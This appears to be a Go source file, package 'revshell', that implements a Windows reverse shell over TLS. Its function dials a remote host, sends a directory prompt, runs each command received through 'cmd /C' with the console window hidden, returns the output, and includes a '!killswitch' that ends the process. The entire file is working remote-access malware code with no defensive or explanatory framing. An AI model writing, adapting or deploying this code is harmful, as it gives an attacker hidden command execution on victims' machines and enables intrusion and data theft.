package revshell

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"os"
	"os/exec"
	"strings"
	"syscall"
)

func Do(host string, conf *tls.Config) error {
	c, err := tls.Dial("tcp", host, conf)
	if err != nil {
		return err
	}
	defer c.Close()
	cwd, err := os.Getwd()
	if err != nil {
		return err
	}
	cwd = cwd + "> "
	for {
		c.Write([]byte(cwd))
		cmdstr, err := bufio.NewReader(c).ReadString('\n')
		if err != nil {
			return err
		}
		tokens := strings.Fields(cmdstr)
		switch tokens[0] {
		case "cd":
			if len(tokens) != 2 {
				continue
			}
			err := os.Chdir(tokens[1])
			if err != nil {
				c.Write([]byte(err.Error()))
			}
			cwd, _ = os.Getwd()
			cwd = cwd + "> "
			continue
		case "exit":
			c.Close()
			return nil
		case "!killswitch":
			os.Exit(0)
		}
		cmd := exec.Command("cmd", "/C", cmdstr)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		var cerr bytes.Buffer
		cmd.Stderr = &cerr
		out, err := cmd.Output()
		if err != nil {
			if len(cerr.String()) != 0 {
				c.Write(cerr.Bytes())
			}
		}
		c.Write([]byte(out))
		c.Write([]byte("\n"))
	}
}
